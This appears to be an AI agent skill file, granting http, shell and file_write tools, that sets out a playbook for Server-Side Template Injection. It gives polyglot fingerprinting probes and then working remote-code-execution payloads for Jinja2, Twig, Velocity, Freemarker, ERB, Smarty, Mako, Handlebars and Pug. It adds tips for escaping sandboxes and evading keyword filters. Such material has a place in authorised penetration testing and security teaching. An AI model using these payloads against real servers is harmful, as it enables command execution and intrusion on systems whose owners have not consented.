---
name: ssti
description: Server-Side Template Injection — fingerprint the engine first (Jinja2 / Twig / Velocity / Freemarker / ERB / Smarty / Mako / Handlebars / Pug), then escalate the engine-specific primitive to RCE or sandbox escape.
allowed-tools:
  - http
  - shell
  - file_write
---

# SSTI playbook

You suspect user input is concatenated into a server-side template. The classic tell: `{{7*7}}` renders as `49` (not as the literal).

## 1. Fingerprint the engine

Polyglot probe:
```
${7*7}
{{7*7}}
<%= 7*7 %>
*{7*7}
{{7*'7'}}
```

| Render result | Engine |
|---|---|
| `49` from `{{7*7}}` AND `7777777` from `{{7*'7'}}` | **Jinja2** (Python) |
| `49` from `{{7*7}}` AND `49` from `{{7*'7'}}` | **Twig** (PHP) |
| `49` from `${7*7}` | **Velocity** / **Freemarker** / Mako |
| `49` from `<%= 7*7 %>` | **ERB** (Ruby) / EJS (Node) |
| `49` from `*{7*7}` | **Smarty** |

## 2. Engine-specific exploitation

### Jinja2 (Python, Flask)
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
Find the index for `subprocess.Popen`, then:
```
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
```

### Twig (PHP, Symfony)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Velocity (Java)
```
#set($e="exp")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")
```

### Freemarker (Java)
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

### ERB (Ruby)
```
<%= `id` %>
<%= system("id") %>
```

### Smarty (PHP)
```
{php}echo `id`;{/php}    {# pre-3.1.30 #}
{system('id')}
```

### Mako (Python)
```
${self.module.cache.util.os.popen('id').read()}
```

### Handlebars (Node)
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.push "return require('child_process').execSync('id');"}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push (lookup conslist.0 "apply")}}{{this.apply 0 codelist}}{{/with}}{{/with}}{{/with}}{{/with}}
```

### Pug / Jade (Node)
```
#{ root.process.mainModule.require('child_process').execSync('id').toString() }
```

## 3. Sandbox escape thinking
If `{{7*7}}` works but exec is blocked:
- Try filter chains (Twig)
- Try indirect attribute access (`['__class__']` instead of `.__class__`)
- Try Unicode escapes on dangerous keywords

## 4. Reporting
For each finding include:
- The exact input field where the payload landed
- The fingerprint output proving SSTI
- An exec PoC or sensitive-data read
- Engine + version inferred
